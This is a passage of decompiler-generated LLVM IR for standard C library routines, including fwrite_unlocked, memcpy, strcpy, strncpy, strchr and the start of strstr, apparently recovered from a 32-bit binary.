  %v0_8051c12 = phi i32 [ %v0_8051c12.pre, %dec_label_pc_8051c08 ], [ 0, %dec_label_pc_8051c0d ]
  store i32 %v0_8051c12, i32* %eax.global-to-local, align 4
  store i32 %v0_8051bb0, i32* @ebp, align 4
  ret i32 %v0_8051c12

; uselistorder directives
  uselistorder i32 %v0_8051c12, { 1, 0 }
  uselistorder i32 %v0_8051c04, { 1, 0 }
  uselistorder i32 %v1_8051c01, { 1, 0 }
  uselistorder i32 %v0_8051be5, { 0, 2, 1 }
  uselistorder i32 %v0_8051bcb, { 1, 0 }
  uselistorder label %dec_label_pc_8051c0f, { 1, 0 }
  uselistorder label %dec_label_pc_8051c04, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_8051bff.dec_label_pc_8051c01_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8051bcb, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8051c1c = load i32, i32* @esi, align 4
  %v0_8051c1d = load i32, i32* @ebx, align 4
  store i32 %v0_8051c1d, i32* %stack_var_-8, align 4
  %v4_8051c21 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c21, i32* @ebx, align 4
  %v3_8051c26 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8051c26, i32* @esi, align 4
  %v0_8051c37 = load i32, i32* @ebx, align 4
  %v6_8051c38 = call i32 @__GI_fwrite_unlocked(i32 %v0_8051c37, i64 1, i32 %v3_8051c26, i32 %arg2)
  %v1_8051c42 = load i32, i32* @esi, align 4
  %v12_8051c42 = icmp eq i32 %v6_8051c38, %v1_8051c42
  %v3_8051c44 = select i1 %v12_8051c42, i32 %v6_8051c38, i32 -1
  %v2_8051c4a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051c4a, i32* @ebx, align 4
  store i32 %v0_8051c1c, i32* @esi, align 4
  ret i32 %v3_8051c44

; uselistorder directives
  uselistorder i32 %v6_8051c38, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8051c50 = load i32, i32* @edi, align 4
  %v0_8051c51 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_8051c57 = trunc i64 %arg2 to i32
  store i32 %v4_8051c57, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_8051c5f = inttoptr i32 %arg4 to i16*
  %v2_8051c5f = load i16, i16* %v1_8051c5f, align 2
  %v1_8051c62 = and i16 %v2_8051c5f, 192
  %v6_8051c67 = icmp eq i16 %v1_8051c62, 192
  br i1 %v6_8051c67, label %dec_label_pc_8051c82, label %dec_label_pc_8051c6e

dec_label_pc_8051c6e:                             ; preds = %entry
  %v0_8051c6e = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_8051c76 = call i32 @__stdio_trans2w_o(i16* %v1_8051c5f, i32 128, i32 %v0_8051c6e, i32 %v0_8051c6e)
  %v1_8051c7e = icmp eq i32 %v6_8051c76, 0
  %v1_8051c80 = icmp eq i1 %v1_8051c7e, false
  br i1 %v1_8051c80, label %dec_label_pc_8051cc2, label %dec_label_pc_8051c82

dec_label_pc_8051c82:                             ; preds = %dec_label_pc_8051c6e, %entry
  %v2_8051c82 = icmp eq i32 %v4_8051c57, 0
  br i1 %v2_8051c82, label %dec_label_pc_8051cc2, label %dec_label_pc_8051c86

dec_label_pc_8051c86:                             ; preds = %dec_label_pc_8051c82
  %v1_8051c86 = icmp eq i32 %arg3, 0
  br i1 %v1_8051c86, label %dec_label_pc_8051cc2, label %dec_label_pc_8051c8a

dec_label_pc_8051c8a:                             ; preds = %dec_label_pc_8051c86
  %v9_8051c8f = udiv i64 4294967295, %arg2
  %v10_8051c8f = trunc i64 %v9_8051c8f to i32
  %v6_8051c93 = icmp ult i32 %v10_8051c8f, %arg3
  br i1 %v6_8051c93, label %dec_label_pc_8051caf, label %dec_label_pc_8051c95

dec_label_pc_8051c95:                             ; preds = %dec_label_pc_8051c8a
  %sext = mul i64 %arg2, 4294967296
  %v2_8051c98 = sdiv i64 %sext, 4294967296
  %v3_8051c98 = sext i32 %arg3 to i64
  %v4_8051c98 = mul nsw i64 %v3_8051c98, %v2_8051c98
  %v5_8051c98 = trunc i64 %v4_8051c98 to i32
  %v0_8051c9b = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_8051ca1 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_8051c98, i32 %v0_8051c9b, i32 %v10_8051c8f)
  %v6_8051ca1 = sext i32 %v5_8051ca1 to i64
  %v10_8051cab = udiv i64 %v6_8051ca1, %arg2
  %v11_8051cab = trunc i64 %v10_8051cab to i32
  br label %dec_label_pc_8051cc4

dec_label_pc_8051caf:                             ; preds = %dec_label_pc_8051c8a
  %v0_8051caf = load i32, i32* @ebx, align 4
  %v1_8051caf = inttoptr i32 %v0_8051caf to i32*
  %v2_8051caf = load i32, i32* %v1_8051caf, align 4
  %v1_8051cb1 = or i32 %v2_8051caf, 8
  %v1_8051cb4 = trunc i32 %v1_8051cb1 to i16
  %v3_8051cb4 = inttoptr i32 %v0_8051caf to i16*
  store i16 %v1_8051cb4, i16* %v3_8051cb4, align 2
  %v0_8051cb7 = load i32, i32* %stack_var_-28, align 4
  %v1_8051cb7 = call i32 @__errno_location(i32 %v0_8051cb7)
  %v1_8051cbc = inttoptr i32 %v1_8051cb7 to i32*
  store i32 22, i32* %v1_8051cbc, align 4
  br label %dec_label_pc_8051cc2

dec_label_pc_8051cc2:                             ; preds = %dec_label_pc_8051c86, %dec_label_pc_8051c82, %dec_label_pc_8051c6e, %dec_label_pc_8051caf
  br label %dec_label_pc_8051cc4

dec_label_pc_8051cc4:                             ; preds = %dec_label_pc_8051c95, %dec_label_pc_8051cc2
  %v0_8051cc7 = phi i32 [ %v11_8051cab, %dec_label_pc_8051c95 ], [ 0, %dec_label_pc_8051cc2 ]
  store i32 %v0_8051c51, i32* @esi, align 4
  store i32 %v0_8051c50, i32* @edi, align 4
  ret i32 %v0_8051cc7

; uselistorder directives
  uselistorder i32 %v0_8051c6e, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 0, 5, 4, 2, 1, 6, 3 }
  uselistorder i32 (i16*, i32, i32, i32)* @__stdio_trans2w_o, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051cc4, { 1, 0 }
  uselistorder label %dec_label_pc_8051cc2, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051cc9 = load i32, i32* @esi, align 4
  store i32 %v0_8051cc9, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8051cca = sdiv i32 %sext, 16777216
  store i32 %v4_8051cca, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051cd2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051cd2, i32* %edi.global-to-local, align 4
  %v2_8051cd8 = udiv i32 %v4_8051cca, 4
  %v3_8051cdb = inttoptr i32 %arg2 to i8*
  %v4_8051cdb = bitcast i16* %arg1 to i8*
  %v5_8051cdb = call i8* @_memcpy(i8* %v4_8051cdb, i8* %v3_8051cdb, i32 %v2_8051cd8)
  %v6_8051cdb = ptrtoint i8* %v5_8051cdb to i32
  store i32 %v6_8051cdb, i32* @ecx, align 4
  %v0_8051cdd = load i32, i32* %eax.global-to-local, align 4
  %v2_8051cdd = and i32 %v0_8051cdd, 2
  %v3_8051cdd = icmp eq i32 %v2_8051cdd, 0
  br i1 %v3_8051cdd, label %dec_label_pc_8051ce3, label %dec_label_pc_8051ce1

dec_label_pc_8051ce1:                             ; preds = %entry
  %v0_8051ce1 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ce1 = inttoptr i32 %v0_8051ce1 to i16*
  %v2_8051ce1 = load i16, i16* %v1_8051ce1, align 2
  %v3_8051ce1 = load i32, i32* %edi.global-to-local, align 4
  %v4_8051ce1 = inttoptr i32 %v3_8051ce1 to i16*
  store i16 %v2_8051ce1, i16* %v4_8051ce1, align 2
  %v5_8051ce1 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051ce1 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051ce1 = load i1, i1* @df, align 1
  %v8_8051ce1 = select i1 %v7_8051ce1, i32 -2, i32 2
  %v9_8051ce1 = add i32 %v8_8051ce1, %v5_8051ce1
  %v10_8051ce1 = add i32 %v8_8051ce1, %v6_8051ce1
  store i32 %v9_8051ce1, i32* %edi.global-to-local, align 4
  store i32 %v10_8051ce1, i32* %esi.global-to-local, align 4
  %v0_8051ce3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ce3

dec_label_pc_8051ce3:                             ; preds = %entry, %dec_label_pc_8051ce1
  %v0_8051ce3 = phi i32 [ %v0_8051cdd, %entry ], [ %v0_8051ce3.pre, %dec_label_pc_8051ce1 ]
  %v2_8051ce3 = urem i32 %v0_8051ce3, 2
  %v3_8051ce3 = icmp eq i32 %v2_8051ce3, 0
  br i1 %v3_8051ce3, label %dec_label_pc_8051ce8, label %dec_label_pc_8051ce7

dec_label_pc_8051ce7:                             ; preds = %dec_label_pc_8051ce3
  %v0_8051ce7 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ce7 = inttoptr i32 %v0_8051ce7 to i8*
  %v2_8051ce7 = load i8, i8* %v1_8051ce7, align 1
  %v3_8051ce7 = load i32, i32* %edi.global-to-local, align 4
  %v4_8051ce7 = inttoptr i32 %v3_8051ce7 to i8*
  store i8 %v2_8051ce7, i8* %v4_8051ce7, align 1
  %v5_8051ce7 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051ce7 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051ce7 = load i1, i1* @df, align 1
  %v8_8051ce7 = select i1 %v7_8051ce7, i32 -1, i32 1
  %v9_8051ce7 = add i32 %v8_8051ce7, %v5_8051ce7
  %v10_8051ce7 = add i32 %v8_8051ce7, %v6_8051ce7
  store i32 %v9_8051ce7, i32* %edi.global-to-local, align 4
  store i32 %v10_8051ce7, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051ce8

dec_label_pc_8051ce8:                             ; preds = %dec_label_pc_8051ce3, %dec_label_pc_8051ce7
  store i32 %v4_8051cd2, i32* %eax.global-to-local, align 4
  %v2_8051cec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051cec, i32* @esi, align 4
  ret i32 %v4_8051cd2

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051ce8, { 1, 0 }
  uselistorder label %dec_label_pc_8051ce3, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8051cf0 = load i32, i32* @edi, align 4
  %v4_8051cf9 = ptrtoint i8* %arg1 to i32
  %v5_8051cfd = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8051cfd = ptrtoint i8* %v5_8051cfd to i32
  store i32 %v6_8051cfd, i32* @ecx, align 4
  store i32 %v0_8051cf0, i32* @edi, align 4
  ret i32 %v4_8051cf9

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8051d0b = load i32, i32* @esi, align 4
  store i32 %v0_8051d0b, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051d13 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051d13, i32* %edi.global-to-local, align 4
  %v3_8051d17 = call i32 @_strlen(i8* %arg1)
  %v2_8051d19 = add i32 %v4_8051d13, -1
  store i32 %v2_8051d19, i32* %edi.global-to-local, align 4
  %v4_8051d1a.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8051d1a.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8051d1a

dec_label_pc_8051d1a:                             ; preds = %dec_label_pc_8051d1a, %entry
  %v2_8051d1b = phi i32 [ %v7_8051d1b, %dec_label_pc_8051d1a ], [ %v2_8051d19, %entry ]
  %v8_8051d1a = phi i1 [ %v5_8051d1b, %dec_label_pc_8051d1a ], [ %v8_8051d1a.pre, %entry ]
  %v4_8051d1a = phi i32 [ %v0_8051d1c, %dec_label_pc_8051d1a ], [ %v4_8051d1a.pre, %entry ]
  %v0_8051d1a = load i32, i32* %esi.global-to-local, align 4
  %v1_8051d1a = inttoptr i32 %v0_8051d1a to i8*
  %v2_8051d1a = load i8, i8* %v1_8051d1a, align 1
  %v3_8051d1a = zext i8 %v2_8051d1a to i32
  %v5_8051d1a = and i32 %v4_8051d1a, -256
  %v6_8051d1a = or i32 %v3_8051d1a, %v5_8051d1a
  store i32 %v6_8051d1a, i32* %eax.global-to-local, align 4
  %v9_8051d1a = select i1 %v8_8051d1a, i32 -1, i32 1
  %v10_8051d1a = add i32 %v0_8051d1a, %v9_8051d1a
  store i32 %v10_8051d1a, i32* %esi.global-to-local, align 4
  %v3_8051d1b = inttoptr i32 %v2_8051d1b to i8*
  store i8 %v2_8051d1a, i8* %v3_8051d1b, align 1
  %v4_8051d1b = load i32, i32* %edi.global-to-local, align 4
  %v5_8051d1b = load i1, i1* @df, align 1
  %v6_8051d1b = select i1 %v5_8051d1b, i32 -1, i32 1
  %v7_8051d1b = add i32 %v6_8051d1b, %v4_8051d1b
  store i32 %v7_8051d1b, i32* %edi.global-to-local, align 4
  %v0_8051d1c = load i32, i32* %eax.global-to-local, align 4
  %v3_8051d1c = trunc i32 %v0_8051d1c to i8
  %v4_8051d1c = icmp eq i8 %v3_8051d1c, 0
  %v1_8051d1e = icmp eq i1 %v4_8051d1c, false
  br i1 %v1_8051d1e, label %dec_label_pc_8051d1a, label %dec_label_pc_8051d20

dec_label_pc_8051d20:                             ; preds = %dec_label_pc_8051d1a
  store i32 %v4_8051d13, i32* %eax.global-to-local, align 4
  %v2_8051d24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051d24, i32* @esi, align 4
  ret i32 %v4_8051d13

; uselistorder directives
  uselistorder i32 %v0_8051d1c, { 1, 0 }
  uselistorder i32 %v7_8051d1b, { 1, 0 }
  uselistorder i1 %v5_8051d1b, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8051d29 = ptrtoint i8* %arg1 to i32
  %v2_8051d31 = mul i32 %arg2, 256
  %v3_8051d31 = and i32 %v2_8051d31, 65280
  %v4_8051d31 = and i32 %arg2, -65281
  %v5_8051d31 = or i32 %v3_8051d31, %v4_8051d31
  %v8_8051d33.pre = load i1, i1* @df, align 1
  %v9_8051d33 = select i1 %v8_8051d33.pre, i32 -1, i32 1
  br label %dec_label_pc_8051d33

dec_label_pc_8051d33:                             ; preds = %dec_label_pc_8051d38, %entry
  %v4_8051d33 = phi i32 [ %v6_8051d33, %dec_label_pc_8051d38 ], [ %v5_8051d31, %entry ]
  %v7_8051d33 = phi i32 [ %v10_8051d33, %dec_label_pc_8051d38 ], [ %v4_8051d29, %entry ]
  %v1_8051d33 = inttoptr i32 %v7_8051d33 to i8*
  %v2_8051d33 = load i8, i8* %v1_8051d33, align 1
  %v10_8051d33 = add i32 %v7_8051d33, %v9_8051d33
  %v3_8051d34 = udiv i32 %v4_8051d33, 256
  %v4_8051d34 = trunc i32 %v3_8051d34 to i8
  %v16_8051d34 = icmp eq i8 %v2_8051d33, %v4_8051d34
  br i1 %v16_8051d34, label %dec_label_pc_8051d41, label %dec_label_pc_8051d38

dec_label_pc_8051d38:                             ; preds = %dec_label_pc_8051d33
  %v3_8051d33 = zext i8 %v2_8051d33 to i32
  %v5_8051d33 = and i32 %v4_8051d33, -256
  %v6_8051d33 = or i32 %v3_8051d33, %v5_8051d33
  %v4_8051d38 = icmp eq i8 %v2_8051d33, 0
  %v1_8051d3a = icmp eq i1 %v4_8051d38, false
  br i1 %v1_8051d3a, label %dec_label_pc_8051d33, label %dec_label_pc_8051d3c

dec_label_pc_8051d3c:                             ; preds = %dec_label_pc_8051d38
  br label %dec_label_pc_8051d41

dec_label_pc_8051d41:                             ; preds = %dec_label_pc_8051d33, %dec_label_pc_8051d3c
  %v0_8051d41 = phi i32 [ 1, %dec_label_pc_8051d3c ], [ %v10_8051d33, %dec_label_pc_8051d33 ]
  %v1_8051d43 = add i32 %v0_8051d41, -1
  ret i32 %v1_8051d43

; uselistorder directives
  uselistorder i8 %v2_8051d33, { 1, 2, 0 }
  uselistorder i32 %v4_8051d33, { 1, 0 }
  uselistorder i32 -65281, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051d41, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051d49 = load i32, i32* @esi, align 4
  store i32 %v0_8051d49, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051d51 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051d51, i32* %edi.global-to-local, align 4
  %v4_8051d55.pre = load i32, i32* @eax, align 4
  %v8_8051d55.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8051d55

dec_label_pc_8051d55:                             ; preds = %dec_label_pc_8051d55.dec_label_pc_8051d55_crit_edge, %entry
  %v2_8051d56 = phi i32 [ %v7_8051d56, %dec_label_pc_8051d55.dec_label_pc_8051d55_crit_edge ], [ %v4_8051d51, %entry ]
  %v8_8051d55 = phi i1 [ %v5_8051d56, %dec_label_pc_8051d55.dec_label_pc_8051d55_crit_edge ], [ %v8_8051d55.pre, %entry ]
  %v4_8051d55 = phi i32 [ %v0_8051d57, %dec_label_pc_8051d55.dec_label_pc_8051d55_crit_edge ], [ %v4_8051d55.pre, %entry ]
  %v7_8051d55 = phi i32 [ %v0_8051d55.pre, %dec_label_pc_8051d55.dec_label_pc_8051d55_crit_edge ], [ %arg2, %entry ]
  %v1_8051d55 = inttoptr i32 %v7_8051d55 to i8*
  %v2_8051d55 = load i8, i8* %v1_8051d55, align 1
  %v3_8051d55 = zext i8 %v2_8051d55 to i32
  %v5_8051d55 = and i32 %v4_8051d55, -256
  %v6_8051d55 = or i32 %v3_8051d55, %v5_8051d55
  store i32 %v6_8051d55, i32* %eax.global-to-local, align 4
  %v9_8051d55 = select i1 %v8_8051d55, i32 -1, i32 1
  %v10_8051d55 = add i32 %v7_8051d55, %v9_8051d55
  store i32 %v10_8051d55, i32* %esi.global-to-local, align 4
  %v3_8051d56 = inttoptr i32 %v2_8051d56 to i8*
  store i8 %v2_8051d55, i8* %v3_8051d56, align 1
  %v4_8051d56 = load i32, i32* %edi.global-to-local, align 4
  %v5_8051d56 = load i1, i1* @df, align 1
  %v6_8051d56 = select i1 %v5_8051d56, i32 -1, i32 1
  %v7_8051d56 = add i32 %v6_8051d56, %v4_8051d56
  store i32 %v7_8051d56, i32* %edi.global-to-local, align 4
  %v0_8051d57 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051d57 = trunc i32 %v0_8051d57 to i8
  %v4_8051d57 = icmp eq i8 %v3_8051d57, 0
  %v1_8051d59 = icmp eq i1 %v4_8051d57, false
  br i1 %v1_8051d59, label %dec_label_pc_8051d55.dec_label_pc_8051d55_crit_edge, label %dec_label_pc_8051d5b

dec_label_pc_8051d55.dec_label_pc_8051d55_crit_edge: ; preds = %dec_label_pc_8051d55
  %v0_8051d55.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051d55

dec_label_pc_8051d5b:                             ; preds = %dec_label_pc_8051d55
  store i32 %v4_8051d51, i32* %eax.global-to-local, align 4
  %v2_8051d5f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051d5f, i32* @edx, align 4
  %v2_8051d60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051d60, i32* @esi, align 4
  ret i32 %v4_8051d51

; uselistorder directives
  uselistorder i32 %v0_8051d57, { 1, 0 }
  uselistorder i32 %v7_8051d56, { 1, 0 }
  uselistorder i1 %v5_8051d56, { 1, 0 }
  uselistorder i32 %v4_8051d51, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051d79 = load i32, i32* @esi, align 4
  store i32 %v0_8051d79, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051d85 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051d85, i32* %edi.global-to-local, align 4
  %v1_8051d89 = add i32 %arg3, 1
  store i32 %v1_8051d89, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051d8a

dec_label_pc_8051d8a:                             ; preds = %dec_label_pc_8051d8d, %entry
  %v3_8051d8e = phi i32 [ %v4_8051d85, %entry ], [ %v8_8051d8e, %dec_label_pc_8051d8d ]
  %v0_8051d8a = phi i32 [ %v1_8051d89, %entry ], [ %v0_8051d8a.pre, %dec_label_pc_8051d8d ]
  %v1_8051d8a = add i32 %v0_8051d8a, -1
  %v8_8051d8a = icmp eq i32 %v1_8051d8a, 0
  store i32 %v1_8051d8a, i32* %ecx.global-to-local, align 4
  br i1 %v8_8051d8a, label %.loopexit, label %dec_label_pc_8051d8d

dec_label_pc_8051d8d:                             ; preds = %dec_label_pc_8051d8a
  %v0_8051d8d = load i32, i32* %esi.global-to-local, align 4
  %v1_8051d8d = inttoptr i32 %v0_8051d8d to i8*
  %v2_8051d8d = load i8, i8* %v1_8051d8d, align 1
  %v10_8051d8d = load i1, i1* @df, align 1
  %v11_8051d8d = select i1 %v10_8051d8d, i32 -1, i32 1
  %v12_8051d8d = add i32 %v11_8051d8d, %v0_8051d8d
  store i32 %v12_8051d8d, i32* %esi.global-to-local, align 4
  %v4_8051d8e = inttoptr i32 %v3_8051d8e to i8*
  store i8 %v2_8051d8d, i8* %v4_8051d8e, align 1
  %v5_8051d8e = load i32, i32* %edi.global-to-local, align 4
  %v6_8051d8e = load i1, i1* @df, align 1
  %v7_8051d8e = select i1 %v6_8051d8e, i32 -1, i32 1
  %v8_8051d8e = add i32 %v7_8051d8e, %v5_8051d8e
  store i32 %v8_8051d8e, i32* %edi.global-to-local, align 4
  %v6_8051d8f = icmp eq i8 %v2_8051d8d, 0
  %v1_8051d91 = icmp eq i1 %v6_8051d8f, false
  %v0_8051d8a.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_8051d91, label %dec_label_pc_8051d8a, label %dec_label_pc_8051d93

dec_label_pc_8051d93:                             ; preds = %dec_label_pc_8051d8d
  %v1_8051d93 = add i32 %v0_8051d8a.pre, -1
  store i32 %v1_8051d93, i32* %ecx.global-to-local, align 4
  %v2_8051d94 = sext i8 %v2_8051d8d to i32
  %v4_8051d94 = inttoptr i32 %v8_8051d8e to i8*
  %v5_8051d94 = call i8* @_memset(i8* %v4_8051d94, i32 %v2_8051d94, i32 %v1_8051d93)
  %v6_8051d94 = ptrtoint i8* %v5_8051d94 to i32
  store i32 %v6_8051d94, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_8051d8a, %dec_label_pc_8051d93
  %v2_8051d9a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051d9a, i32* @edx, align 4
  %v2_8051d9b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051d9b, i32* @esi, align 4
  ret i32 %v4_8051d85

; uselistorder directives
  uselistorder i32 %v8_8051d8e, { 0, 2, 1 }
  uselistorder i8 %v2_8051d8d, { 0, 2, 1 }
  uselistorder i32 %v1_8051d8a, { 1, 0 }
  uselistorder i32 %v4_8051d85, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_8051da0 = ptrtoint i8* %tmp4 to i32
  %v8_8051db38 = icmp eq i32 %tmp, 0
  %v1_8051db410 = icmp eq i1 %v8_8051db38, false
  br i1 %v1_8051db410, label %dec_label_pc_8051dad, label %dec_label_pc_8051db6

dec_label_pc_8051dad:                             ; preds = %entry, %dec_label_pc_8051db2
  %v1_8051db312 = phi i32 [ %v1_8051db3, %dec_label_pc_8051db2 ], [ %tmp, %entry ]
  %v0_8051db611 = phi i32 [ %v1_8051db2, %dec_label_pc_8051db2 ], [ %v4_8051da0, %entry ]
  %v1_8051dad = inttoptr i32 %v0_8051db611 to i8*
  %v2_8051dad = load i8, i8* %v1_8051dad, align 1
  %v3_8051dad = icmp eq i8 %v2_8051dad, 0
  br i1 %v3_8051dad, label %dec_label_pc_8051db6, label %dec_label_pc_8051db2

dec_label_pc_8051db2:                             ; preds = %dec_label_pc_8051dad
  %v1_8051db2 = add i32 %v0_8051db611, 1
  %v1_8051db3 = add i32 %v1_8051db312, -1
  %v8_8051db3 = icmp eq i32 %v1_8051db3, 0
  %v1_8051db4 = icmp eq i1 %v8_8051db3, false
  br i1 %v1_8051db4, label %dec_label_pc_8051dad, label %dec_label_pc_8051db6

dec_label_pc_8051db6:                             ; preds = %dec_label_pc_8051db2, %dec_label_pc_8051dad, %entry
  %v0_8051db6.lcssa = phi i32 [ %v4_8051da0, %entry ], [ %v0_8051db611, %dec_label_pc_8051dad ], [ %v1_8051db2, %dec_label_pc_8051db2 ]
  %v2_8051db6 = sub i32 %v0_8051db6.lcssa, %v4_8051da0
  ret i32 %v2_8051db6

; uselistorder directives
  uselistorder i32 %v1_8051db3, { 1, 0 }
  uselistorder i32 %v0_8051db611, { 0, 2, 1 }
  uselistorder i32 %v4_8051da0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051dad, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_8051dbf = load i32, i32* @ebx, align 4
  %v4_8051dc3 = ptrtoint i8* %arg2 to i32
  %v2_8051dcb = load i8, i8* %arg2, align 1
  %v1_8051dce = icmp eq i8 %v2_8051dcb, 0
  br i1 %v1_8051dce, label %dec_label_pc_8051e82, label %dec_label_pc_8051dd9

dec_label_pc_8051dd9:                             ; preds = %entry
  %v1_8051dd9 = add i32 %arg1, -1
  br label %dec_label_pc_8051dda

dec_label_pc_8051dda:                             ; preds = %dec_label_pc_8051de6, %dec_label_pc_8051dd9
  %v0_8051dda = phi i32 [ %v1_8051dda, %dec_label_pc_8051de6 ], [ %v1_8051dd9, %dec_label_pc_8051dd9 ]
  %v1_8051dda = add i32 %v0_8051dda, 1
  %v1_8051ddb = inttoptr i32 %v1_8051dda to i8*
  %v2_8051ddb = load i8, i8* %v1_8051ddb, align 1
  %v1_8051dde = icmp eq i8 %v2_8051ddb, 0
  br i1 %v1_8051dde, label %dec_label_pc_8051e80, label %dec_label_pc_8051de6

dec_label_pc_8051de6:                             ; preds = %dec_label_pc_8051dda
  %v14_8051de6 = icmp eq i8 %v2_8051ddb, %v2_8051dcb
  %v1_8051de9 = icmp eq i1 %v14_8051de6, false
  br i1 %v1_8051de9, label %dec_label_pc_8051dda, label %dec_label_pc_8051deb

dec_label_pc_8051deb:                             ; preds = %dec_label_pc_8051de6
  %v1_8051deb = add i32 %v4_8051dc3, 1
  %v2_8051df2 = inttoptr i32 %v1_8051deb to i8*
  %v3_8051df2 = load i8, i8* %v2_8051df2, align 1
  %v1_8051df6 = icmp eq i8 %v3_8051df2, 0
  br i1 %v1_8051df6, label %dec_label_pc_8051e82, label %dec_label_pc_8051dfe

dec_label_pc_8051dfe:                             ; preds = %dec_label_pc_8051deb
  %v1_8051dfe = add i32 %v0_8051dda, 2
  %v1_8051e48 = add i32 %v4_8051dc3, 2
  %v2_8051e48 = inttoptr i32 %v1_8051e48 to i8*
  br label %dec_label_pc_8051e34

dec_label_pc_8051e09:                             ; preds = %dec_label_pc_8051e78
  %v2_8051e09 = inttoptr i32 %v0_8051e3a to i8*
  %v3_8051e09 = load i8, i8* %v2_8051e09, align 1
  br label %dec_label_pc_8051e27.preheader

